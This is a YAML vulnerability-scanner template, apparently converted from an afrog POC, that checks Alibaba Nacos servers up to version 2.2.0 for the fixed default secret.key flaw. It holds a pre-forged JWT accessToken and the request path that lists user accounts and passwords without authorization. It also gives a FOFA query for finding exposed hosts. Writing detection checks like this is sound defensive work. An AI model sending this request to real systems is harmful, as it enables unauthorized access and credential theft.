# 来源: afrog（转换自 afrog/xray 表达式 POC）
http:
  - matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - '"username":'
          - '"password":'
        condition: and
      - type: word
        part: header
        words:
          - application/json
        condition: and
    method: GET
    path:
      - '{{BaseURL}}/nacos/v1/auth/users?accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY5ODg5NDcyN30.feetKmWoPnMkAebjkNnyuKo6c21_hzTgu0dfNqbdpZQ&pageNo=1&pageSize=9'
id: nacos-secret-default-key-unauth
info:
  author: zan8in
  description: |-
    Alibaba Nacos 使用了固定的secret.key默认密钥，导致攻击者可以构造请求获取敏感信息，导致未授权访问漏洞
    Alibaba Nacos <= 2.2.0
    fofa: app="NACOS"
  metadata:
    argus-execution-class: detection
    argus-import-license: MIT License
    argus-import-source: afrog
    argus-risk-level: high
  name: Alibaba Nacos secret.key默认密钥 未授权访问漏洞
  severity: high
  tags: nacos,unauth,argus-import
